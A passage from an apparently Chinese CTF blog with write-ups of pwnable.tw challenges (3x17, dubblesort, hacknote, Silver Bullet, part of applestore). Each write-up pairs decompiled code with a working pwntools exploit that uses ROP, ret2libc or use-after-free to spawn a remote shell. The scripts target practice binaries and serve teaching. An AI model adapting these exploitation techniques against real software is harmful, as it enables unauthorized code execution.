<p>我们可以看到程序由后向前调用函数指针，<code>fini_array</code>一共两项，我们可以直接一次性将<code>fini_array[0]</code>写为<code>__libc_csu_fini</code>函数地址，<code>fini_array[1]</code>写为<code>main</code>函数地址。然后我们就可以循环调用main函数实现无数次任意地址写，（对于main函数中的那个判断，可以不用管，它自己会溢出）。</p>
<p>然后我们要解决的是往哪写ROP链，写完如何执行的问题。这里我们注意<code>__libc_csu_fini</code>函数中，有一句<code>lea     rbp, off_4B40F0</code>，因此我们可以直接往<code>fini_array</code>数组后写ROP链，写完后直接修改函数指针为<code>leave; ret</code>栈迁移到该处执行即可。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10105</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./3x17&#x27;)</span></span><br><span class="line"></span><br><span class="line">fini = <span class="number">0x402960</span></span><br><span class="line">fini_array = <span class="number">0x4b40f0</span></span><br><span class="line">main = <span class="number">0x401b6d</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">io.send(<span class="built_in">str</span>(fini_array).encode())</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">io.send(p64(fini)+p64(main))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401696</span></span><br><span class="line">pop_rsi = <span class="number">0x406c30</span></span><br><span class="line">pop_rdx = <span class="number">0x446e35</span></span><br><span class="line">pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">syscall = <span class="number">0x4022b4</span></span><br><span class="line">leave_ret = <span class="number">0x401c4b</span></span><br><span class="line"></span><br><span class="line">bin_sh = fini_array+<span class="number">0x10</span>+<span class="number">0x48</span></span><br><span class="line">payload = [pop_rdi, bin_sh, pop_rsi, <span class="number">0</span>, pop_rdx, <span class="number">0</span>, pop_rax, <span class="number">59</span>, syscall, <span class="number">0x68732f6e69622f</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(fini_array+<span class="number">0x10</span>+<span class="number">8</span>*i).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">    io.send(p64(payload[i]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#在执行fini时rbp变为0x4b40f0，执行leave_ret进行栈迁移</span></span><br><span class="line"><span class="comment">#attach(io, &#x27;b 0x4b40f0&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">io.send(<span class="built_in">str</span>(fini_array).encode())</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">io.send(p64(leave_ret)+p64(pop_rdi+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x05-dubblesort"><a href="#0x05-dubblesort" class="headerlink" title="0x05. dubblesort"></a>0x05. dubblesort</h2><p><code>checksec</code>看到保护全开，IDA打开</p>
<p>先输入name，不存在溢出，但是可以泄露出栈中脏数据，可以直接得到libc基地址，但是本地和远程偏移不一样，具体试出来就差了一个dowrd，我调了好久，md</p>
<p>然后会让你输入排序的数字个数，输入各个数字，然后sort排序，排序时会直接原地排序，最后打印。观察循环</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1</span>, <span class="string">&quot;Enter the %d number : &quot;</span>);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, v4);</span><br><span class="line">      v3 = v8;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到v4会一直自增，因此存在溢出，可以直接写ROP链，但需要绕过canary，可以在不需要改数据时直接输入<code>-</code>绕过scanf。还需要注意sort会进行原地排序，因此输入的数据必须由小到大。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输入name泄露栈中libc地址，利用变量v4进行ROP. 需要注意sort函数会将输入排序，因此在输入值时必须按照大小顺序</span></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10101</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./dubblesort&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./dubblesort&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;What your name :&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">29</span>)			<span class="comment">#本地为io.send(b&#x27;A&#x27;*25)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;A&#x27;</span>*<span class="number">28</span>)		<span class="comment">#本地为io.recvuntil(b&#x27;A&#x27;*28)</span></span><br><span class="line">libcbase = u64(io.recv(<span class="number">4</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1b0041</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">pop_edi = libcbase + <span class="number">0x177db</span></span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">sys = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = [sys, bin_sh-<span class="number">0x10</span>, bin_sh]</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;How many numbers do you what to sort :&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;35&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;-&#x27;</span>)   <span class="comment">#canary</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">0xf0000000</span>).encode())   <span class="comment">#ebp</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(payload[i]).encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x06-hacknote"><a href="#0x06-hacknote" class="headerlink" title="0x06. hacknote"></a>0x06. hacknote</h2><p><code>checksec</code>看到只开了NX和canary，打开IDA看到是一个常规的堆题</p>
<p>有add，delete，show功能，注意add功能中</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)*(&amp;ptr + i) = sub_804862B;</span><br></pre></td></tr></table></figure></div>

<p>再看show功能中</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(&amp;ptr + v1) )</span><br><span class="line">    (*(<span class="type">void</span> (__cdecl **)(_DWORD))*(&amp;ptr + v1))(*(&amp;ptr + v1));</span><br></pre></td></tr></table></figure></div>

<p>这里是直接调用了函数指针，这个函数指针为</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">4</span>));</span><br></pre></td></tr></table></figure></div>

<p>并且在delete功能中程序存在UAF，因此直接UAF篡改函数指针为system函数就行了</p>
<p>exp：</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10102</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./hacknote&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Note size :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Content :&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露libc</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;A&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;A&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">libcbase = u32(io.recv(<span class="number">3</span>).rjust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1b0700</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">sys = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#直接打指针为system</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x8</span>, p32(sys)+<span class="string">b&#x27;&amp; sh&#x27;</span>)  <span class="comment">#3</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x07-Silver-Bullet"><a href="#0x07-Silver-Bullet" class="headerlink" title="0x07. Silver Bullet"></a>0x07. Silver Bullet</h2><p><code>checksec</code>看到开启了FULL RELRO和NX，IDA打开</p>
<p>看到程序共有三个选项<code>create_bullet</code>,<code>power_up</code>,<code>beat</code>。我们必须首先create一个bullet，然后才能对其powerup，然后需要beat掉Werewolf，但是它的HP很高，而我们按照正常逻辑每次最多只能打掉0x30，但是我们成功后还需要通过ROP来getshell</p>
<p><code>create_bullet</code>函数很简单，先读入数据，然后写入长度</p>
<p>然后来看<code>power_up</code>函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">power_up</span><span class="params">(<span class="type">char</span> *dest)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [esp+0h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// [esp+30h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="keyword">if</span> ( !*dest )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You need create the bullet first !&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)dest + <span class="number">12</span>) &gt; <span class="number">0x2F</span>u )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t power up any more !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me your another description of bullet :&quot;</span>);</span><br><span class="line">  read_input(s, <span class="number">48</span> - *((_DWORD *)dest + <span class="number">12</span>));</span><br><span class="line">  <span class="built_in">strncat</span>(dest, s, <span class="number">48</span> - *((_DWORD *)dest + <span class="number">12</span>));</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s) + *((_DWORD *)dest + <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your new power is : %u\n&quot;</span>, v3);</span><br><span class="line">  *((_DWORD *)dest + <span class="number">12</span>) = v3;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Enjoy it !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>注意这里的strncat函数，看似我们已经被完全限制了，但是该函数在拷贝的时候会将终止符<code>\x00</code>也拷贝过去，从而使power为0. 这样只要我们再次进入<code>power_up</code>函数，就可以造成溢出，溢出后的power会根据写入的数据变得相对大，然后直接beat()后正常从main返回到ROP链进行ret2libc</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用strncat函数会将字符\x00连接进去来清空power值来造成溢出</span></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10103</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./silver_bullet&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./silver_bullet&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Give me your description of bullet :&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">powerup</span>(<span class="params">content</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Give me your another description of bullet :&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">beat</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x2f</span>)</span><br><span class="line">powerup(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">powerup(<span class="string">b&#x27;AAAAAAA&#x27;</span>+p32(puts_plt)+p32(main)+p32(puts_got))</span><br><span class="line">beat()</span><br><span class="line">beat()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Oh ! You win !!\n&#x27;</span>)</span><br><span class="line">libcbase = u32(io.recv(<span class="number">4</span>))-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">sys = libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x2f</span>)</span><br><span class="line">powerup(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">powerup(<span class="string">b&#x27;AAAAAAA&#x27;</span>+p32(sys)+<span class="string">b&#x27;AAAA&#x27;</span>+p32(bin_sh))</span><br><span class="line">beat()</span><br><span class="line">beat()</span><br><span class="line"></span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x08-applestore"><a href="#0x08-applestore" class="headerlink" title="0x08. applestore"></a>0x08. applestore</h2><p><code>checksec</code>看到只开了canary和NX</p>
<p>IDA打开可以看到是一个菜单题，功能是放置一些东西到购物车中，可以list列出商品，add添加商品到购物车，delete从购物车中移出商品，cart查看购物车，还有checkout函数中可以在满足条件的情况下1元购买iphone-8，接下来仔细分析各个函数</p>
<p><code>list()</code>函数就是打印商品名，编号和价格</p>
<p><code>add()</code>函数会先在<code>create()</code>函数中<code>malloc(0x10)</code>，这个chunk被分成四个部分，chunk[0]存储商品名称地址，chunk[1]存储商品价格，chunk[2]和chunk[3]暂时置为0。然后再<code>insert()</code>函数中，会将该chunk置入购物车，也就是双向链表中，chunk[2]和chunk[3]分别对应fd和bk。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> **v1; <span class="comment">// [esp+1Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">22</span>]; <span class="comment">// [esp+26h] [ebp-22h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Device Number&gt; &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  my_read(nptr, <span class="number">0x15</span>u);</span><br><span class="line">  <span class="keyword">switch</span> ( atoi(nptr) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      v1 = create(<span class="string">&quot;iPhone 6&quot;</span>, (<span class="type">char</span> *)<span class="number">199</span>);</span><br><span class="line">      insert((<span class="type">int</span>)v1);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      v1 = create(<span class="string">&quot;iPhone 6 Plus&quot;</span>, (<span class="type">char</span> *)<span class="number">299</span>);</span><br><span class="line">      insert((<span class="type">int</span>)v1);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      v1 = create(<span class="string">&quot;iPad Air 2&quot;</span>, (<span class="type">char</span> *)<span class="number">499</span>);</span><br><span class="line">      insert((<span class="type">int</span>)v1);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      v1 = create(<span class="string">&quot;iPad Mini 3&quot;</span>, (<span class="type">char</span> *)<span class="number">399</span>);</span><br><span class="line">      insert((<span class="type">int</span>)v1);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      v1 = create(<span class="string">&quot;iPod Touch&quot;</span>, (<span class="type">char</span> *)<span class="number">199</span>);</span><br><span class="line">      insert((<span class="type">int</span>)v1);</span><br><span class="line">LABEL_8:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;ve put *%s* in your shopping cart.\n&quot;</span>, *v1);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Brilliant! That&#x27;s an amazing idea.&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Stop doing that. Idiot!&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>delete()</code>就是很正常的双向链表删除操作，<code>cart()</code>会打印商品编号，名称和价格</p>
<p>然后来看<code>checkout()</code>函数</p>
